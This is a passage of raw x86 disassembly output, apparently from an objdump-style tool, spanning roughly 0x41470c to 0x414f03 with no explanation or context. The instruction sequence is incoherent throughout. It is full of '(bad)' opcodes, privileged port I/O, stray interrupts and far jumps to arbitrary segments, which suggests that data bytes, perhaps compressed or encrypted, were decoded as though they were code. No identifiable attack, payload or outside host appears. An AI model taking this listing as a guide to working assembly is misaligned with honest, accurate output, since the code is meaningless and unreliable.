  41470c:	adc    eax,0x600a861a
  414711:	mov    esi,0x9e245f1f
  414716:	pop    esi
  414717:	sbb    cl,BYTE PTR [edx-0x2d76629d]
  41471d:	int    0x92
  41471f:	aad    0xb2
  414721:	scas   eax,DWORD PTR es:[edi]
  414722:	pop    esp
  414723:	mov    eax,ds:0x791f711c
  414728:	mov    eax,0x8e5f1ec7
  41472d:	jp     0x414791
  41472f:	inc    esp
  414730:	cld    
  414731:	das    
  414732:	pushf  
  414733:	or     ah,BYTE PTR [edx+0x7844df65]
  414739:	inc    ecx
  41473a:	push   ds
  41473b:	add    esp,DWORD PTR [ecx+0x70af82dd]
  414741:	or     eax,0x1518ed44
  414746:	jp     0x414715
  414748:	(bad)  
  414749:	mov    eax,ds:0xa84a1bb7
  41474e:	gs jecxz 0x414787
  414751:	jecxz  0x4147b5
  414753:	cmp    BYTE PTR [ecx-0x31badb55],cl
  414759:	call   0x7f5c:0x14799e9b
  414760:	mov    bh,0xfe
  414762:	shl    BYTE PTR [ebp-0x30],0x11
  414766:	xor    BYTE PTR [esi-0x46b9887e],bh
  41476c:	sti    
  41476d:	(bad)  
  41476e:	pusha  
  41476f:	mov    ebp,0x3d5cab09
  414774:	inc    edx
  414775:	add    bl,BYTE PTR [eax]
  414777:	loope  0x414747
  414779:	imul   ebx,eax,0x4
  41477c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41477d:	shl    DWORD PTR [eax+0x39],0x22
  414781:	jbe    0x4147f4
  414783:	xchg   ecx,eax
  414784:	loopne 0x4147c5
  414786:	xchg   ebx,eax
  414787:	je     0x4147ed
  414789:	add    dh,al
  41478b:	sbb    al,BYTE PTR [eax]
  41478d:	fmul   DWORD PTR [ecx]
  41478f:	add    DWORD PTR cs:[ebx+0x5d],ecx
  414793:	pop    es
  414794:	jle    0x414755
  414796:	pusha  
  414797:	mov    esi,ecx
  414799:	mov    ecx,0x3603729
  41479e:	cmp    dl,BYTE PTR [esi+edi*8]
  4147a1:	sub    al,0xba
  4147a3:	sbb    bh,BYTE PTR [edx+edi*1+0x1e]
  4147a7:	jnp    0x41477a
  4147a9:	push   ds
  4147aa:	outs   dx,DWORD PTR ds:[esi]
  4147ab:	cmp    BYTE PTR [edx-0x1d],0x9a
  4147af:	aad    0x35
  4147b1:	jae    0x4147a4
  4147b3:	clc    
  4147b4:	cmc    
  4147b5:	cmp    eax,0x79af5109
  4147ba:	mov    edi,0xc2fb8845
  4147bf:	mov    al,0xe2
  4147c1:	(bad)  
  4147c2:	sahf   
  4147c3:	aad    0xab
  4147c5:	adc    al,0x7f
  4147c7:	jae    0x414758
  4147c9:	ror    edx,0xc4
  4147cc:	(bad)  
  4147cd:	sub    eax,DWORD PTR [eax+0xd]
  4147d0:	loope  0x414827
  4147d2:	jno    0x414768
  4147d4:	pusha  
  4147d5:	mov    ecx,0x75d6b52d
  4147da:	lock pop edi
  4147dc:	or     BYTE PTR [ebp+0x42],dl
  4147df:	push   esi
  4147e0:	sbb    eax,0x9d3d60f4
  4147e5:	pop    bp
  4147e7:	scas   al,BYTE PTR es:[edi]
  4147e8:	pop    esi
  4147e9:	mov    al,0x45
  4147eb:	test   DWORD PTR [ebx-0x44],ecx
  4147ee:	arpl   sp,cx
  4147f0:	pop    eax
  4147f1:	jmp    0x19e:0x2a1a055c
  4147f8:	cmc    
  4147f9:	pop    ebp
  4147fa:	aam    0x48
  4147fc:	ss sbb al,0x94
  4147ff:	inc    edi
  414800:	sub    DWORD PTR [ecx],eax
  414802:	dec    eax
  414803:	push   ss
  414804:	mov    ch,bl
  414806:	push   ebx
  414807:	xchg   ecx,eax
  414808:	dec    eax
  414809:	pop    edx
  41480a:	(bad)  ds:0x618c028a
  414810:	ss xchg edi,eax
  414812:	fisttp QWORD PTR [ecx]
  414814:	in     al,dx
  414815:	sti    
  414816:	pusha  
  414817:	int    0xb3
  414819:	and    esi,DWORD PTR [edx+0x41]
  41481c:	pop    edx
  41481d:	jecxz  0x4147f1
  41481f:	aam    0x95
  414821:	aad    0xfd
  414823:	aad    0xb8
  414825:	div    ebp
  414827:	das    
  414828:	mov    edi,DWORD PTR [ecx]
  41482a:	cmp    al,0x89
  41482c:	aaa    
  41482d:	sub    al,cl
  41482f:	inc    ecx
  414830:	pop    eax
  414831:	push   ebp
  414832:	xchg   edx,eax
  414833:	stos   BYTE PTR es:[edi],al
  414834:	sbb    DWORD PTR [edx+ebx*8-0x6eddfbe8],0x75
  41483c:	push   esi
  41483d:	(bad)  
  41483e:	aas    
  41483f:	dec    ebx
  414840:	mov    bl,dl
  414842:	add    eax,0xf8da1e9a
  414847:	out    dx,al
  414848:	daa    
  414849:	add    dl,BYTE PTR [eax+esi*1+0x5e]
  41484d:	out    0x76,al
  41484f:	push   0x3f
  414851:	mov    eax,0x151bd993
  414856:	dec    BYTE PTR [ebx-0x19]
  414859:	enter  0x433f,0x4e
  41485d:	and    al,0xd
  41485f:	aam    0xe2
  414861:	das    
  414862:	into   
  414863:	out    dx,eax
  414864:	adc    BYTE PTR [ebx-0x5476d7c0],dh
  41486a:	mov    al,ds:0x729bee14
  41486f:	inc    eax
  414870:	mov    ds:0xb34bf41b,eax
  414875:	daa    
  414876:	cmp    ah,dl
  414878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414879:	dec    ebx
  41487a:	add    eax,0x432788bd
  41487f:	in     al,dx
  414880:	cmp    edx,esi
  414882:	push   ecx
  414883:	inc    edx
  414884:	sbb    eax,0x692b7225
  414889:	adc    DWORD PTR [esi],ebx
  41488b:	imul   ecx,DWORD PTR [ebx-0x7b],0xad888c17
  414892:	sub    BYTE PTR [eax+edx*2],al
  414895:	les    eax,FWORD PTR es:[eax+0x2eb60232]
  41489c:	jnp    0x4148c5
  41489e:	inc    edi
  41489f:	or     DWORD PTR [eax],edi
  4148a1:	je     0x414879
  4148a3:	je     0x41482e
  4148a5:	pop    ecx
  4148a6:	or     ebp,DWORD PTR [ecx-0x65]
  4148a9:	je     0x414874
  4148ab:	pop    ecx
  4148ac:	gs dec eax
  4148ae:	xchg   ecx,eax
  4148af:	dec    edi
  4148b0:	mov    edx,esp
  4148b2:	lds    edi,FWORD PTR [esi-0x5d68b20b]
  4148b8:	mov    ecx,edx
  4148ba:	jge    0x4148fd
  4148bc:	js     0x414908
  4148be:	add    BYTE PTR [ecx-0x311fc94],bh
  4148c4:	cmp    BYTE PTR [ebx+esi*2],ah
  4148c7:	pop    ss
  4148c8:	ficomp WORD PTR [eax]
  4148ca:	pop    ds
  4148cb:	lds    eax,FWORD PTR [ecx]
  4148cd:	ss ja  0x414899
  4148d0:	push   0xffffffe4
  4148d2:	into   
  4148d3:	aam    0xf2
  4148d5:	call   0x999ece1e
  4148da:	mov    al,ds:0xfb8b8965
  4148df:	mov    ds:0x6b3a37ba,eax
  4148e4:	inc    ebx
  4148e5:	push   0x2e
  4148e7:	mov    esp,0xd6321451
  4148ec:	xchg   esp,eax
  4148ed:	or     dh,0x16
  4148f0:	das    
  4148f1:	std    
  4148f2:	and    BYTE PTR [edx],0x88
  4148f5:	cmp    ebp,0x6a
  4148f8:	popf   
  4148f9:	push   edx
  4148fa:	add    ecx,ecx
  4148fc:	push   edx
  4148fd:	add    ecx,DWORD PTR [edx]
  4148ff:	xor    BYTE PTR [ebp-0x72f4e562],0x93
  414906:	jge    0x4148c5
  414908:	into   
  414909:	das    
  41490a:	mov    ah,0xfb
  41490c:	mov    eax,0x9a898305
  414911:	inc    esi
  414912:	push   ss
  414913:	mov    edx,0x671ca014
  414918:	dec    ecx
  414919:	je     0x414906
  41491b:	ret    0x3e35
  41491e:	pop    ds
  41491f:	fwait
  414920:	(bad)  
  414921:	stc    
  414922:	or     BYTE PTR [ecx-0x2],ch
  414925:	inc    ecx
  414926:	dec    ebp
  414927:	in     eax,dx
  414928:	or     eax,0x45ea5203
  41492d:	sub    eax,0xc4daae1a
  414932:	xchg   edx,eax
  414933:	jge    0x414977
  414935:	add    DWORD PTR [ecx-0x3e],ecx
  414938:	xchg   ebp,eax
  414939:	xor    eax,eax
  41493b:	cmp    dh,BYTE PTR [eax+0x55]
  41493e:	test   eax,0xffa60fb8
  414943:	(bad)  
  414944:	leave  
  414945:	in     eax,dx
  414946:	outs   dx,BYTE PTR ds:[esi]
  414947:	retf   0x8512
  41494a:	xchg   edi,eax
  41494b:	pop    ss
  41494c:	mov    ah,0x2
  41494e:	fidivr DWORD PTR [ecx+ebx*8]
  414952:	inc    esp
  414953:	mov    ds:0xe50014ba,al
  414958:	fdiv   DWORD PTR [esi-0x43]
  41495b:	push   esp
  41495c:	xor    ebp,edi
  41495e:	stos   BYTE PTR es:[edi],al
  41495f:	fidiv  WORD PTR [edi+edi*2+0x2208716d]
  414966:	add    DWORD PTR [eax-0x3a],0x26d58e4f
  41496d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41496e:	adc    BYTE PTR [esi+edx*2-0x7653089d],bh
  414975:	int    0x27
  414977:	pop    ebp
  414978:	pop    esi
  414979:	push   0xffffff86
  41497b:	out    dx,al
  41497c:	push   es
  41497d:	xchg   DWORD PTR ds:0xf4559508,ebx
  414983:	mov    ecx,0xbc22749
  414988:	mov    ds:0x46891f52,eax
  41498d:	sub    ah,BYTE PTR [eax]
  41498f:	push   edi
  414990:	mov    dh,0xcd
  414992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414993:	aam    0x4f
  414995:	and    bh,ch
  414997:	adc    BYTE PTR [ecx+0x27],0x2d
  41499b:	sbb    DWORD PTR [esi+0x7e910949],esi
  4149a1:	sbb    eax,0x522f4c6e
  4149a6:	mov    ebp,0xad3edc94
  4149ab:	aad    0x54
  4149ad:	call   0x9a0d:0x58ffca63
  4149b4:	mov    bh,BYTE PTR ds:0x41935c12
  4149ba:	add    ecx,DWORD PTR [ebx-0x77]
  4149bd:	mov    esi,0x2f577ba0
  4149c2:	xlat   BYTE PTR ds:[ebx]
  4149c3:	dec    edi
  4149c4:	jg     0x4149a2
  4149c6:	pusha  
  4149c7:	fwait
  4149c8:	sbb    eax,0xb57ecbec
  4149cd:	and    BYTE PTR ds:0xe402efc9,cl
  4149d3:	and    eax,0x82a9a496
  4149d8:	mov    ss,esp
  4149da:	call   0xe0da:0x1105c497
  4149e1:	or     ah,BYTE PTR [edx-0xc]
  4149e4:	into   
  4149e5:	add    eax,0x3801f166
  4149ea:	and    eax,ebp
  4149ec:	xor    ch,dl
  4149ee:	gs pop edi
  4149f0:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149f2:	mov    ?,WORD PTR ds:0x347e92d1
  4149f8:	mov    al,0x5
  4149fa:	mov    esp,0x89858cb8
  4149ff:	mov    esi,0x657b0848
  414a04:	shr    BYTE PTR [edi-0x68332bb8],0x4
  414a0b:	add    al,0x9e
  414a0d:	inc    esi
  414a0e:	out    0xc1,al
  414a10:	mov    eax,DWORD PTR [ebp-0x13ed6642]
  414a16:	adc    BYTE PTR [eax-0x9],dl
  414a19:	imul   edi,DWORD PTR [ecx-0x56],0x18
  414a1d:	ins    DWORD PTR es:[edi],dx
  414a1e:	(bad)  
  414a20:	imul   eax,DWORD PTR [ecx-0x1],0xc214c8db
  414a27:	retf   
  414a28:	jge    0x4149eb
  414a2a:	out    dx,al
  414a2b:	jne    0x414a82
  414a2d:	cs push ebp
  414a2f:	pushf  
  414a30:	mov    BYTE PTR [ecx+0x1014b0ab],dh
  414a36:	(bad)  [edx*1+0x556f5a03]
  414a3d:	mov    ecx,0x51e55e47
  414a42:	pop    ds
  414a43:	adc    ebp,DWORD PTR [ecx+0x30e2e9cb]
  414a49:	push   0x3c
  414a4b:	xlat   BYTE PTR ds:[ebx]
  414a4c:	div    DWORD PTR [ebx+0x3e]
  414a4f:	sahf   
  414a50:	cmp    al,0x5a
  414a52:	(bad)  [ecx*4+0xe14978f]
  414a59:	push   eax
  414a5a:	mov    ah,0x54
  414a5c:	mov    ah,BYTE PTR [ebp-0x58]
  414a5f:	(bad)  
  414a60:	dec    ebp
  414a61:	mov    esi,0xa1d21253
  414a66:	cwde   
  414a67:	add    eax,0xf360fa76
  414a6c:	shl    dh,0x5d
  414a6f:	pop    edi
  414a70:	jp     0x414a97
  414a72:	outs   dx,DWORD PTR ds:[esi]
  414a73:	lahf   
  414a74:	adc    eax,0x1d5ffe3
  414a79:	test   eax,0x51f049cf
  414a7e:	pop    ds
  414a7f:	lds    esp,FWORD PTR [ebp+0x6e0014eb]
  414a85:	gs scas ax,WORD PTR es:[edi]
  414a88:	add    eax,0xc8422751
  414a8d:	test   DWORD PTR [eax+0x1f372171],esp
  414a93:	pop    ebp
  414a94:	nop
  414a95:	out    0xfb,al
  414a97:	dec    esi
  414a98:	dec    edx
  414a99:	cs inc ebx
  414a9b:	aad    0x9a
  414a9d:	and    al,0x9c
  414a9f:	bound  ebx,QWORD PTR [edi+0x72]
  414aa2:	xor    DWORD PTR [ecx+ecx*4+0x7e7d3279],eax
  414aa9:	mov    eax,gs
  414aab:	shr    eax,1
  414aad:	add    ch,BYTE PTR [eax+0x1188832]
  414ab3:	xor    al,0xca
  414ab5:	jmp    0x7c1b:0xad930b60
  414abc:	fmul   DWORD PTR [edi+0x20]
  414abf:	aam    0x42
  414ac1:	addr16 jmp 0x88c2:0xda51739b
  414ac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aca:	fcomip st,st(3)
  414acc:	pop    edi
  414acd:	mov    dl,0xe6
  414acf:	pop    ds
  414ad0:	cmc    
  414ad1:	lods   eax,DWORD PTR ds:[esi]
  414ad2:	sbb    eax,0xf34f8806
  414ad7:	fild   WORD PTR [ebx+0x60]
  414ada:	or     bh,ch
  414adc:	mov    ch,0x4d
  414ade:	jl     0x414ade
  414ae0:	or     BYTE PTR [edi],dh
  414ae2:	out    dx,al
  414ae3:	in     eax,0xf4
  414ae5:	lock (bad) 
  414ae7:	aad    0xb7
  414ae9:	out    dx,al
  414aea:	push   ebx
  414aeb:	jmp    0x414a7e
  414aed:	test   BYTE PTR [edi+0x791ff6cc],ah
  414af3:	aam    0xce
  414af5:	(bad)  
  414af6:	nop
  414af7:	jg     0x414b0b
  414af9:	push   esi
  414afa:	add    edx,edi
  414afc:	icebp  
  414afd:	stc    
  414afe:	and    al,0xb2
  414b00:	mov    al,ds:0xffdd7348
  414b05:	cdq    
  414b06:	outs   dx,BYTE PTR ds:[esi]
  414b07:	aam    0xb
  414b09:	sub    DWORD PTR [eax+0x7f1756dc],0xffffffd5
  414b10:	mov    dl,0x1d
  414b12:	mov    ecx,0x83f693c0
  414b17:	sbb    cl,BYTE PTR [eax+0x5a60f029]
  414b1d:	dec    esi
  414b1e:	out    0x44,al
  414b20:	cmp    eax,0x74d72e03
  414b25:	loop   0x414b88
  414b27:	or     al,0x23
  414b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b2a:	jge    0x414b8b
  414b2c:	jno    0x414abc
  414b2e:	mov    eax,ds:0xb918bf14
  414b33:	xchg   esp,ebx
  414b35:	add    bh,dh
  414b37:	add    DWORD PTR [edi],0x307f1ad1
  414b3d:	inc    edx
  414b3e:	push   ds
  414b3f:	sbb    DWORD PTR [ecx-0x40],0x2d
  414b43:	mov    ch,0x31
  414b45:	ret    
  414b46:	or     ch,BYTE PTR [edi-0x18]
  414b49:	out    0xc3,eax
  414b4b:	aam    0xbb
  414b4d:	lahf   
  414b4e:	(bad)  
  414b4f:	sbb    ch,dh
  414b51:	dec    edx
  414b52:	pop    ds
  414b53:	and    edi,DWORD PTR [ebx]
  414b55:	outs   dx,DWORD PTR gs:[esi]
  414b57:	mov    ss,WORD PTR [esi]
  414b59:	(bad)  
  414b5a:	loope  0x414b30
  414b5c:	mov    ebx,esp
  414b5e:	adc    DWORD PTR [edi-0x4b],0x883b0c1a
  414b65:	fild   DWORD PTR [edi]
  414b67:	add    DWORD PTR [ebx+0x4e],ecx
  414b6a:	pop    edx
  414b6b:	lods   eax,DWORD PTR ds:[esi]
  414b6c:	data16 add ah,BYTE PTR [esi]
  414b6f:	out    0x71,al
  414b71:	mov    DWORD PTR [ebx+0x6d74bf12],edi
  414b77:	push   ebp
  414b78:	retf   0x1e0c
  414b7b:	xchg   ebp,eax
  414b7c:	or     BYTE PTR [eax+0x2e],bl
  414b7f:	and    BYTE PTR [edi],bh
  414b81:	fisub  DWORD PTR [esi+0x30f778f5]
  414b87:	xlat   BYTE PTR ds:[ebx]
  414b88:	mov    edi,DWORD PTR [eax]
  414b8a:	mov    ecx,0x14a900b6
  414b8f:	pop    ds
  414b90:	mov    edi,ebx
  414b92:	jp     0x414b2d
  414b94:	cmpps  xmm0,XMMWORD PTR [eax-0x12],0xae
  414b99:	add    ah,ah
  414b9b:	cmp    BYTE PTR [eax],al
  414b9d:	clc    
  414b9e:	push   ebx
  414b9f:	dec    edx
  414ba0:	mov    edx,0x47f16501
  414ba5:	adc    BYTE PTR [edi-0x46fe8a28],bh
  414bab:	push   esi
  414bac:	fs ret 
  414bae:	lds    eax,FWORD PTR [eax-0x7b3ffcd1]
  414bb4:	cmc    
  414bb5:	inc    ebx
  414bb6:	jbe    0x414b4f
  414bb8:	cmp    bh,BYTE PTR [esi]
  414bba:	jo     0x414c15
  414bbc:	js     0x414b83
  414bbe:	(bad)  
  414bbf:	sar    al,cl
  414bc1:	or     eax,DWORD PTR ds:0x6c0a8cc4
  414bc7:	aad    0x20
  414bc9:	lods   al,BYTE PTR ds:[esi]
  414bca:	or     ecx,DWORD PTR [esi+0x3e0e1c38]
  414bd0:	(bad)  
  414bd1:	mov    edi,0x501bd55f
  414bd6:	pop    edx
  414bd7:	sbb    DWORD PTR [edx-0x25],ebp
  414bda:	cdq    
  414bdb:	aad    0xfd
  414bdd:	lods   eax,DWORD PTR ds:[esi]
  414bde:	dec    ebp
  414bdf:	ins    BYTE PTR es:[edi],dx
  414be0:	ror    DWORD PTR [edi+edx*8+0x7a],cl
  414be4:	mov    ebp,ecx
  414be6:	or     DWORD PTR [ebx*1+0x3a130752],edx
  414bed:	clc    
  414bee:	add    edx,esp
  414bf0:	shr    BYTE PTR [eax+0x791f9aad],1
  414bf6:	mov    ds:0x60e87631,eax
  414bfb:	popf   
  414bfc:	aas    
  414bfd:	les    esp,FWORD PTR [eax+0x6e]
  414c00:	jmp    0x493a:0xb9d5d3ee
  414c07:	sbb    esp,DWORD PTR [edx-0x77952f7a]
  414c0d:	retf   
  414c0e:	mov    dl,al
  414c10:	daa    
  414c11:	stos   DWORD PTR es:[edi],eax
  414c12:	ds mov ebp,0x5f6e1cea
  414c18:	xor    al,0x36
  414c1a:	sahf   
  414c1b:	dec    ecx
  414c1c:	pop    ecx
  414c1d:	mov    bl,0xe2
  414c1f:	clc    
  414c20:	mov    BYTE PTR [edi],dl
  414c22:	push   ebp
  414c23:	push   ebx
  414c24:	xchg   BYTE PTR [edi-0xf],bh
  414c27:	aaa    
  414c28:	xchg   edi,eax
  414c29:	add    bh,BYTE PTR [esi-0x3751e13d]
  414c2f:	sbb    edx,DWORD PTR [eax+0x39]
  414c32:	ins    BYTE PTR es:[edi],dx
  414c33:	and    esi,DWORD PTR [eax-0x23]
  414c36:	(bad)  
  414c37:	mov    esi,0x7a666689
  414c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c3d:	adc    BYTE PTR [eax+edx*1],dh
  414c40:	jecxz  0x414c8b
  414c42:	pop    ds
  414c43:	enter  0xaceb,0xd9
  414c47:	cmc    
  414c48:	mov    dh,BYTE PTR [ebp-0x2aef8379]
  414c4e:	jnp    0x414bed
  414c50:	cmp    BYTE PTR [ecx+0x7f],ch
  414c53:	ror    ebx,cl
  414c55:	call   0x3d3e:0x4808629d
  414c5c:	lock rol DWORD PTR [ecx],0x8e
  414c60:	xchg   esi,eax
  414c61:	inc    ebp
  414c62:	dec    edi
  414c63:	xchg   BYTE PTR [ecx-0x7e],dh
  414c66:	cmp    eax,0x57c30ec1
  414c6b:	mov    ebx,0x8ffd8059
  414c70:	dec    eax
  414c71:	jo     0x414cdc
  414c73:	pop    eax
  414c74:	dec    edi
  414c75:	mov    ds,WORD PTR [edi]
  414c77:	lahf   
  414c78:	test   BYTE PTR [edi-0x17],ch
  414c7b:	mov    ecx,0xd4880090
  414c80:	and    eax,0x688c5f47
  414c85:	adc    edx,0xffffffc8
  414c88:	mov    dl,cl
  414c8a:	inc    eax
  414c8b:	inc    eax
  414c8c:	out    0x32,al
  414c8e:	scas   eax,DWORD PTR es:[edi]
  414c8f:	push   cs
  414c90:	call   0x50df5b72
  414c95:	fst    DWORD PTR gs:[ebp-0x5c]
  414c99:	jp     0x414c89
  414c9b:	jge    0x414c78
  414c9d:	pop    ss
  414c9e:	pop    ds
  414c9f:	ja     0x414cd6
  414ca1:	dec    esp
  414ca2:	cmp    DWORD PTR [eax-0x590d903a],eax
  414ca8:	sahf   
  414ca9:	sti    
  414caa:	jmp    0x414c9f
  414cac:	mov    BYTE PTR [ebx-0x7c323b0f],bh
  414cb2:	push   es
  414cb3:	inc    edx
  414cb4:	mov    ebx,ebx
  414cb6:	sbb    BYTE PTR [edi-0x71],dh
  414cb9:	and    DWORD PTR [edi+0x7805c378],0x72140f47
  414cc3:	sub    esp,eax
  414cc5:	cmc    
  414cc6:	popa   
  414cc7:	daa    
  414cc8:	or     DWORD PTR [ebp+0x76],edx
  414ccb:	sbb    DWORD PTR [edi],edx
  414ccd:	(bad)  
  414ccf:	cwde   
  414cd0:	jmp    0x1f65:0xf52a058b
  414cd7:	cmp    al,0x58
  414cd9:	add    BYTE PTR [esi+ebx*4-0x73],bl
  414cdd:	icebp  
  414cde:	pop    ds
  414cdf:	fldenv [eax]
  414ce1:	pop    ebp
  414ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ce3:	adc    bl,BYTE PTR ds:0x9941808d
  414ce9:	sub    al,0x4c
  414ceb:	inc    ebp
  414cec:	sub    DWORD PTR [ebx],eax
  414cee:	push   esi
  414cef:	sbb    ebp,ebp
  414cf1:	mov    ecx,0x358879fa
  414cf6:	push   0x1e130053
  414cfb:	pop    edx
  414cfc:	rol    BYTE PTR [edx],1
  414cfe:	test   BYTE PTR [esp+edi*1],al
  414d01:	xor    eax,0x1f6bd11d
  414d07:	(bad)  
  414d08:	sub    eax,DWORD PTR [edx-0xb19d0b7]
  414d0e:	or     eax,0x1bf599d7
  414d13:	lahf   
  414d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d15:	lds    eax,FWORD PTR [ebx]
  414d17:	loopne 0x414ca1
  414d19:	sti    
  414d1a:	mov    esi,DWORD PTR [edx+edi*2-0x3587ba66]
  414d21:	add    eax,0x28eba4ec
  414d26:	pop    esi
  414d27:	mov    ch,0x79
  414d29:	sbb    al,0x4e
  414d2b:	les    ecx,FWORD PTR [ebx-0x7b01490f]
  414d31:	pop    eax
  414d32:	test   BYTE PTR [esi-0xc76e997],dl
  414d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d39:	add    eax,0xa397796c
  414d3e:	rol    DWORD PTR [edi+0x71fb41f],cl
  414d44:	sbb    al,0x5f
  414d46:	and    dh,BYTE PTR [ecx+0x5ab01279]
  414d4c:	mov    ds:0x6516605f,al
  414d51:	and    eax,0xe3091eca
  414d56:	(bad)  
  414d57:	mov    ebx,0x947ad389
  414d5c:	mov    esi,0xdcdd927c
  414d61:	add    eax,0xb28cab7e
  414d66:	in     al,dx
  414d67:	xor    eax,0x3f61afb0
  414d6c:	js     0x414d88
  414d6e:	jno    0x414d9c
  414d70:	mov    ch,0x94
  414d72:	out    0xb2,eax
  414d74:	inc    esp
  414d75:	push   edi
  414d76:	push   edx
  414d77:	(bad)
  414d7a:	ror    bl,0xb9
  414d7d:	idiv   DWORD PTR [edi+esi*8]
  414d80:	pop    eax
  414d81:	loope  0x414da2
  414d83:	inc    edi
  414d84:	or     BYTE PTR [ebx+0x4b],dh
  414d87:	mov    ah,0x64
  414d89:	dec    edi
  414d8a:	mov    ch,0xd5
  414d8c:	cmp    dl,BYTE PTR [ebp+edi*2+0x4e]
  414d90:	mov    ds:0xb194b69d,al
  414d95:	or     eax,0x889d98e
  414d9a:	jnp    0x414d5a
  414d9c:	cwde   
  414d9d:	sbb    eax,0xdf0dd4f2
  414da2:	mov    eax,0xf7ae8387
  414da7:	push   eax
  414da8:	xchg   DWORD PTR ds:0x60e3b033,edx
  414dae:	ds cmp al,0xb8
  414db1:	xor    DWORD PTR [edi+0x7c032910],edi
  414db7:	out    0xaf,eax
  414db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dba:	adc    ah,BYTE PTR [ebx+0x560f4877]
  414dc0:	mov    DWORD PTR [ecx-0x1d],ebx
  414dc3:	ins    DWORD PTR es:[edi],dx
  414dc4:	test   DWORD PTR [esi+0xc],esp
  414dc7:	inc    ecx
  414dc8:	sub    al,0x2
  414dca:	and    dl,BYTE PTR [ecx-0x2cb0861f]
  414dd0:	(bad)  
  414dd1:	xchg   edi,eax
  414dd2:	cwde   
  414dd3:	stos   DWORD PTR es:[edi],eax
  414dd4:	push   ebp
  414dd5:	add    ecx,ebp
  414dd7:	lods   eax,DWORD PTR ds:[esi]
  414dd8:	mov    edx,DWORD PTR [esp+eax*2+0x43]
  414ddc:	ds (bad) 
  414dde:	ds mov al,dl
  414de1:	cmp    eax,0x21f5f25
  414de6:	sub    al,0xf7
  414de8:	sbb    BYTE PTR [ebp+0x5a32c78],al
  414dee:	adc    BYTE PTR [esi-0x6cea2f54],dl
  414df4:	pop    eax
  414df5:	fs push ds
  414df7:	rcl    DWORD PTR [esi-0x7],1
  414dfa:	cli    
  414dfb:	(bad)  
  414dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dfd:	adc    eax,0x73cba341
  414e02:	aam    0x60
  414e04:	mov    BYTE PTR [esi],ch
  414e06:	jb     0x414dbd
  414e08:	jo     0x414dd2
  414e0a:	pusha  
  414e0b:	and    DWORD PTR [ecx+0x5a25797f],esp
  414e11:	adc    eax,0xc6d7a7db
  414e16:	sbb    al,0xa1
  414e18:	mov    BYTE PTR [eax-0x6d360a61],dh
  414e1e:	pop    esi
  414e1f:	xlat   BYTE PTR ds:[ebx]
  414e20:	rcr    ecx,0xe0
  414e23:	adc    DWORD PTR ds:0x21374eac,esp
  414e29:	add    eax,DWORD PTR [edx-0x7b]
  414e2c:	jo     0x414e1e
  414e2e:	imul   esp,edi,0x64
  414e31:	loope  0x414e93
  414e33:	scas   eax,DWORD PTR es:[edi]
  414e34:	and    al,0xd5
  414e36:	mov    bl,0x14
  414e38:	ds rcl dl,cl
  414e3b:	aam    0xd3
  414e3d:	and    eax,0xead8079e
  414e42:	div    DWORD PTR [esi-0x78]
  414e45:	setns  dl
  414e48:	cwde   
  414e49:	xchg   DWORD PTR [esi-0x10],eax
  414e4c:	in     eax,dx
  414e4d:	add    cl,BYTE PTR [edx+0x74]
  414e50:	fiadd  DWORD PTR [edi-0x13]
  414e53:	(bad)  
  414e54:	mov    ebx,0x47cd1f37
  414e59:	jge    0x414e5f
  414e5b:	or     ebp,DWORD PTR [eax]
  414e5d:	inc    ebx
  414e5e:	sbb    edx,ebx
  414e60:	adc    ch,cl
  414e62:	xchg   esi,eax
  414e63:	and    bh,bl
  414e65:	jno    0x414e45
  414e67:	xchg   DWORD PTR [edx-0x4df89a8b],ebp
  414e6d:	imul   eax,ebp,0x5a
  414e70:	add    BYTE PTR [ebp-0x5b],ah
  414e73:	pop    ss
  414e74:	push   edi
  414e75:	mov    ds:0x27f82db2,eax
  414e7a:	xchg   dh,cl
  414e7c:	or     al,0x23
  414e7e:	mov    eax,ds:0xf6f1f6db
  414e83:	adc    eax,0x63940cf7
  414e88:	mov    ebx,0xa2d65005
  414e8d:	and    DWORD PTR [ebx+0x71],ebp
  414e90:	inc    edi
  414e91:	add    bl,BYTE PTR [eax+eax*1+0x1c]
  414e95:	and    BYTE PTR [esi+0x30],bh
  414e98:	retf   
  414e99:	or     bl,BYTE PTR [edi]
  414e9b:	arpl   WORD PTR [ebp-0x69],di
  414e9e:	xor    BYTE PTR [edx],0x9d
  414ea1:	ds stos DWORD PTR es:[edi],eax
  414ea3:	into   
  414ea4:	arpl   WORD PTR [edx+0x69],ax
  414ea7:	cmp    al,0x2
  414eaa:	cmp    ah,BYTE PTR [ecx-0x7a]
  414ead:	xor    al,BYTE PTR ds:0x608f19a9
  414eb3:	xchg   ebx,ecx
  414eb5:	adc    DWORD PTR [esi+0x698b7e95],ebp
  414ebb:	pushf  
  414ebc:	(bad)  
  414ebe:	pushf  
  414ebf:	push   esp
  414ec0:	cmp    eax,0x2b47b695
  414ec5:	in     eax,dx
  414ec6:	pop    ds
  414ec7:	out    0x85,eax
  414ec9:	fwait
  414eca:	push   esp
  414ecb:	div    BYTE PTR [edx+eiz*8-0x72]
  414ecf:	aam    0xc9
  414ed1:	hlt    
  414ed2:	mov    ss,di
  414ed5:	mov    bh,0x79
  414ed7:	add    BYTE PTR [edi-0x8c6a395],bl
  414edd:	pop    ds
  414ede:	push   esi
  414edf:	mov    dl,0xa4
  414ee1:	xor    dl,ch
  414ee3:	out    0xe0,al
  414ee5:	idiv   DWORD PTR [edi]
  414ee7:	xlat   BYTE PTR ds:[ebx]
  414ee8:	xchg   BYTE PTR [esi+edi*2-0x7b],bh
  414eec:	push   edi
  414eed:	imul   eax,esp,0xc2e988d5
  414ef3:	mov    ecx,0x69c9e365
  414ef8:	mov    esi,0xbf90402
  414efd:	jns    0x414f41
  414eff:	jmp    0x414f4f
  414f01:	jo     0x414f1b
  414f03:	push   0xffffff8f
